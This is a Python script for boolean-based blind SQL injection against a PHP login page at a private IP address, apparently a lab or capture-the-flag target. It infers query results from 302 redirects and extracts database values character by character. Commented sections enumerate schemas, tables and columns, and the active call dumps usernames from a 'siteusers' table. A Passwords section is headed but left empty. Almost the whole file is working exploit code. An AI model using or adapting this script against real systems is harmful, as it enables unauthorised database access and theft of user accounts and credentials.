#!/usr/bin/env python3

import requests

TARGET_URL = "http://10.49.148.37/index.php"
VALID_USERNAME = "hello"

session = requests.Session()


def send_payload(username_payload):
    try:
        response = requests.post(       # ← No session; fresh cookies every time
            TARGET_URL,
            data={
                "username": username_payload,
                "password": "asd",
            },
            timeout=10,
            allow_redirects=False,      # ← Catch the 302, don't follow it
        )
        return response.status_code == 302

    except requests.RequestException as error:
        print(f"\n[!] Request failed: {error}")
        return False


def get_count(column, table, sql_filter=""):
    """Determine the number of rows returned by the query."""
    for count in range(1, 101):
        payload = (
            f"{VALID_USERNAME}' AND "
            f"(SELECT COUNT({column}) FROM {table} {sql_filter})="
            f"{count}-- -"
        )

        if send_payload(payload):
            return count

    return 0


def get_value_length(index, column, table, sql_filter=""):
    """Determine the length of one selected value."""
    for length in range(1, 101):
        payload = (
            f"{VALID_USERNAME}' AND "
            f"LENGTH((SELECT {column} FROM {table} "
            f"{sql_filter} LIMIT {index},1))={length}-- -"
        )

        if send_payload(payload):
            return length

    return 0


def extract_values(column, table, sql_filter=""):
    """Extract all values character-by-character."""
    values = []

    row_count = get_count(column, table, sql_filter)

    print(f"\n[*] {column}: {row_count} row(s)")

    if row_count == 0:
        return values

    for row_index in range(row_count):
        value_length = get_value_length(
            row_index,
            column,
            table,
            sql_filter,
        )

        if value_length == 0:
            print(f"[!] Could not determine length of row {row_index}")
            continue

        value = ""

        for char_index in range(1, value_length + 1):
            for char_ord in range(32, 127):
                payload = (
                    f"{VALID_USERNAME}' AND "
                    f"ORD(SUBSTR("
                    f"(SELECT {column} FROM {table} "
                    f"{sql_filter} LIMIT {row_index},1),"
                    f"{char_index},1))={char_ord}-- -"
                )

                if send_payload(payload):
                    value += chr(char_ord)
                    print(
                        f"\r[+] {column}[{row_index}] = {value}",
                        end="",
                        flush=True,
                    )
                    break

        print()
        values.append(value)

    return values


# ---------------------------------------------------------
# Database names
# ---------------------------------------------------------

# print(
#     extract_values(
#         "schema_name",
#         "information_schema.schemata"
#     )
# )


# ---------------------------------------------------------
# Tables in mywebsite
# ---------------------------------------------------------

# print(
#     extract_values(
#         "table_name",
#         "information_schema.tables",
#         'WHERE table_schema="mywebsite"'
#     )
# )


# ---------------------------------------------------------
# Columns in siteusers
# ---------------------------------------------------------

# print(
#     extract_values(
#         "column_name",
#         "information_schema.columns",
#         'WHERE table_name="siteusers" '
#         'AND table_schema="mywebsite"'
#     )
# )


# ---------------------------------------------------------
# Usernames
# ---------------------------------------------------------

print(
    extract_values(
        "username",
        "mywebsite.siteusers",
        f'WHERE username!="{VALID_USERNAME}"'
    )
)


# ---------------------------------------------------------
# Passwords
# ---------------------------------------------------------

